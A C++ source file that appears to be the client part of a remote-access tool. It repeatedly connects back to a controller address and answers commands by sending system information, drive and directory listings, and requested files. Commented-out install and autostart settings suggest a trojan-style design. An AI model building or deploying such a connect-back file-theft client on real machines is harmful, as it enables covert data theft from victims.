#include "StdAfx.h"
#include "ThreadMain.h"
#include "MySocket.h"
#include "Common.h"
#include "SystemInfo.h"



CThreadMain::CThreadMain(void)
{
}


CThreadMain::~CThreadMain(void)
{
}


void CThreadMain::GetInfo()
{
	/*
    int Port = atoi(czPort);
    this->Time = atoi(czTime);
    this->SetupDir = atoi(czSetupDir);
    this->AutoFlag = atoi(czAuto);
	*/
	int Port = 8000;
	this->Time = 60;
	//this->SetupDir = 0;
	//this->AutoFlag = 1; 
	
	m_sock.m_port = Port;
	strcpy_s(Address, "127.0.0.1");


}

SOCKET CThreadMain::Run()
{
	
    SOCKET sock;
    while(true)
    {
        sock = m_sock.StartSocket(this->Address);
        if(sock == NULL)
        {
            Sleep(this->Time * 1000);
            printf("Sleep\n");
            continue;
        }
        else
        {
            break;
        }
    }
    return sock;
}

void CThreadMain::Command(SOCKET Sock)
{
    MSGINFO_S msg;
    m_Socket = Sock;
    while(1)
    {
        if(this->RunFlag == false)
        {
            break;
        }
        memset(&msg,0,sizeof(MSGINFO_S));
        if(m_sock.MyRecv(Sock,(char*)&msg,sizeof(MSGINFO_S))==0)
        {
            break;
        }
        ExecCommand(msg,Sock);
    }
    return;
}

void CThreadMain::ExecCommand(MSGINFO_S msg,SOCKET l_Socket)
{
    switch(msg.Msg_id)
        {
        case SYSINFO:
            {
                printf("GetSystemInfo\n");
                m_sys.SendSysinfo(l_Socket);
            }
            break;
		case DISKINFO:
			{
				printf("getdiskinfo\n");
				m_disk.SendDrivers(l_Socket);
			}
			break;
		case FILELIST:
			{
				printf("getfilelist\n");
				wchar_t path[260];
                memcpy(path,msg.context,sizeof(path));
                m_disk.SendFileList(path,l_Socket);
			}
			break;
		case DOWNLOAD:
			{
				printf("DownloadFile\n");
				TEMPSTRUCT temp;
				memcpy((void*)temp.context,(void*)msg.context,sizeof(temp.context));
				temp.sock = l_Socket;
				temp.t = (DWORD)&m_disk;
				::CloseHandle(CreateThread(0,0,ToDownFile,(LPVOID)&temp,0,0));
			}
			break;
		default:
            {
                printf("UnKnow Command\n");
                return;
				
				
				
            }
        }
}

DWORD WINAPI CThreadMain::ToDownFile(LPVOID self)
{
    TEMPSTRUCT temp;
    memcpy((void*)&temp,self,sizeof(TEMPSTRUCT));
    wchar_t DownPath[260];
    memcpy(DownPath,temp.context,sizeof(DownPath));
    CDisk *m_dis;
    m_dis = (CDisk*)temp.t;
    m_dis->DownFile(temp.sock,DownPath);
    return 0;
}